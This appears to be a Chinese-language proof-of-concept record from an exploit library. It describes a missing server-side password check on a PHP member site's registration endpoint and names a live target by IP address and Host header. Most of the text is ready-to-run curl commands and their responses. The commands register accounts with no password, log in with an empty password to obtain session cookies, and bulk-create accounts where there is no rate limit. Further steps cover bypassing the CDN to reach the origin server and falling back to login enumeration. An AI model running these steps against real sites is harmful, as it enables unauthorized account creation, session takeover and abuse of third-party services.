# 自研 PHP 会员站 /Home/Index/register 服务端不校验口令（不传 pwd 即以 md5('') 入库、空口令可登录；pwd1 完全不校验）

- **code**: 自研-php-会员站-home-index-register-服务端不校验口令-不传-pwd-即以-md5-入
- **kind**: poc
- **category**: weak-password
- **component**: 自研 PHP 会员系统（ThinkPHP 风格路由 /Home/Index/*，JSON 接口）
- **severity**: low
- **language**: http
- **source**: self
- **verified**: 1
- **verified_note**: task#648 / finding_id=1323，2026-11-10 在本机 Windows 用 curl.exe -k --noproxy '*' 直连 https://45.151.135.176（Host: usertobbs.thb.mysqbbthisgoodsfor33333user.top）实测四步：① POST /Home/Index/register 只传 name=x6dcew8e1&other=x（不带 pwd/pwd1）→ 200 {"userid":"1244#d41d8cd98f00b204e9800998ecf8427e","ok":1,"ms":"注册成功"}，回显哈希即 md5('')；② 同账号 POST /Home/Index/login name=x6dcew8e1&pwd= → 200 {"ok":1,"ms":"登录成功"} 并下发 Set-Cookie: PHPSESSID=...，证明空口令是真实存储凭据；③ POST /Home/Index/register name=x6dcew8e0&pwd=Abcd1234&pwd1=Abcd12345 → 200 ok:1 注册成功，服务端不比对 pwd1；④ 用 pwd1 的值 Abcd12345 登录返回 {"ms":"账号或密码错误，请检查重新输入!"}，用 pwd 的值 Abcd1234 登录成功，确证只认 pwd。同一时刻连续 40+ 次注册/登录全 200，无验证码无频控。
- **path**: pocs/自研-php-会员站-home-index-register-服务端不校验口令-不传-pwd-即以-md5-入/poc.http
- **tags**: weak-password,register,member,pwd1,空口令,empty-password,md5,thinkphp,自研php,no-rate-limit
- **created_at**: 2026-11-09T17:08:53.644Z
- **engine**: https://thbac1dsua6v.gwtkx5hgk5.xyz/（实测源站 https://45.151.135.176，Host: usertobbs.thb.mysqbbthisgoodsfor33333user.top）

## 描述

自研 PHP 会员系统注册接口 /Home/Index/register 完全没有服务端必填与一致性校验：不传 pwd 也创建账号并以 md5('') 入库，随后空口令即可登录；pwd1（确认口令）只是前端字段，服务端从不比对。可直接低成本批量生成空口令会员账号，是后续会话获取/业务逻辑测试的免费入口。危害以账号体系噪音与批量占用为主，故定 low。

## 用法

```
前置：目标开放注册、接口为 JSON（ThinkPHP 风格 /Home/Index/register、/Home/Index/login）；无需任何账号或 Cookie；HTTPS 自签常见 → curl -k；本机代理会污染直连 → --noproxy '*'。

第 0 步 判活（先看是不是这套接口）：POST /Home/Index/register 带 name=随机串&other=x，期望 200 且 JSON 里出现 ok 与 ms。
第 12 步 核心判定（是否缺服务端校验）：只传 name 与 other，不传 pwd —— 若返回 ok:1 且 userid 里的哈希等于 d41d8cd98f00b204e9800998ecf8427e（md5('')），即空口令被 md5 后写库；再用 name+空 pwd 登录，拿到 Set-Cookie: PHPSESSID 且 ok:1 即确认空口令账号真实可用。
第 3 步 判定 pwd1 是否只是前端字段：pwd 与 pwd1 故意不一致（如 Abcd1234 / Abcd12345），仍返回注册成功；随后分别用两个值登录，只有 pwd 能登进去。
第 4 步 规模化评估：无验证码、无频控时可低成本批量造空口令账号（本目标 40+ 次请求全 200）。

判据汇总：注册接口的响应里直接回显 userid#md5(明文)，这是最容易利用的一点——回显哈希可直接反查口令强度。
失败常见原因：① 走的是 CDN/前置域名而非源站，Host 不在白名单 → 404/默认站；② 未加 -k 且证书自签 → SSL 报错；③ 用本机代理 → 连接被劫持/超时；④ 带上了浏览器会话但服务端要求 CSRF token 的同类实现 → 先 GET 注册页取 token；⑤ 注册被关（返回 disabled 类文案）→ 此路不通，改走登录侧。
本目标的通道细节：域名解析为 fake-ip 不可用时，直连源站 IP + 站内白名单 Host（本例 45.151.135.176 + usertobbs.thb.mysqbbthisgoodsfor33333user.top）。
```

## 正文

```
# 自研 PHP 会员站注册接口服务端校验缺失

## 结论
POST /Home/Index/register 只做前端校验：
- `pwd` 不传也注册成功，服务端拿空串做 md5('') = d41d8cd98f00b204e9800998ecf8427e 写库；
- `pwd` / `pwd1` 不比对，`pwd1` 根本不是提交字段；
- 注册成功响应直接回显 `userid#md5(明文口令)`。

## 环境 / 通道
- 入口：`POST /Home/Index/register`、`POST /Home/Index/login`（JSON 回显，ThinkPHP 风格路由）
- 无需账号、无需 Cookie
- 域名解析为 fake-ip 时直连源站 IP 并用站内白名单 Host；HTTPS 自签用 `-k`
- 本机代理会污染直连，统一 `--noproxy '*'`

```bash
IP=<源站IP>
HOST=<站内白名单域名>
```

## 1) 不传 pwd 注册（证明服务端不校验必填）

```bash
curl -k --noproxy '*' -s -X POST "https://$IP/Home/Index/register" \
  -H "Host: $HOST" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data 'name=x6dcew8e1&other=x'
```

回显：

```json
{"userid":"1244#d41d8cd98f00b204e9800998ecf8427e","balance":0,"username":"x6dcew8e1","ok":1,"ms":"注册成功"}
```

`d41d8cd98f00b204e9800998ecf8427e` = md5('')，说明空口令已 md5 后入库。

## 2) 空口令登录（证明 md5('') 就是真实凭据）

```bash
curl -k --noproxy '*' -s -i -X POST "https://$IP/Home/Index/login" \
  -H "Host: $HOST" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data 'name=x6dcew8e1&pwd='
```

回显：

```
Set-Cookie: PHPSESSID=b54npvm58sbt7i2g707eon9d77; expires=...; path=/
{"ok":1,"ms":"登录成功","userid":"1244#d41d8cd98f00b204e9800998ecf8427e","username":"x6dcew8e1","balance":"0"}
```

## 3) pwd 与 pwd1 不一致仍注册成功

```bash
curl -k --noproxy '*' -s -X POST "https://$IP/Home/Index/register" \
  -H "Host: $HOST" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data 'name=x6dcew8e0&pwd=Abcd1234&pwd1=Abcd12345&other=x'
```

→ `{"userid":"1243#325a2cc052914ceeb8c19016c091d2ac","balance":0,"username":"x6dcew8e0","ok":1,"ms":"注册成功"}`

## 4) 只认 pwd，pwd1 仅前端字段

```bash
# 用 pwd1 的值登录 → 失败
curl -k --noproxy '*' -s -X POST "https://$IP/Home/Index/login" \
  -H "Host: $HOST" -H "Content-Type: application/x-www-form-urlencoded" \
  --data 'name=x6dcew8e0&pwd=Abcd12345'
# {"ms":"账号或密码错误，请检查重新输入!"}

# 用 pwd 的值登录 → 成功
curl -k --noproxy '*' -s -X POST "https://$IP/Home/Index/login" \
  -H "Host: $HOST" -H "Content-Type: application/x-www-form-urlencoded" \
  --data 'name=x6dcew8e0&pwd=Abcd1234'
# {"ok":1,"ms":"登录成功",...}
```

## 判据
1. 不传 pwd 注册返回 ok:1，且 userid 后缀 = md5('')；
2. 空 pwd 登录返回 ok:1 并下发 PHPSESSID；
3. pwd≠pwd1 仍 ok:1；
4. pwd1 值登录失败、pwd 值登录成功。

四条齐 → 服务端零校验，空口令账号真实可用。

## 失败排查
- 404 / 默认站页面 → Host 不在白名单，换该实例绑定的域名；或走了 CDN 而非源站
- SSL 错误 → 加 `-k` / verify=False
- 超时 / 结果异常 → 本机代理作祟，`--noproxy '*'` 或 requests `trust_env=False`
- 返回注册已关闭 → 改走登录侧弱口令/枚举
- 同类实现要求 CSRF token → 先 GET 注册页取隐藏字段

## 影响与延伸
无验证码、无频控（实测同时 40+ 次注册/登录全 200），可批量生成空口令会员账号作为后续会话/业务逻辑测试的免费载体；注册响应回显 md5 口令，可直接用于口令强度判定与彩虹表反查。

```
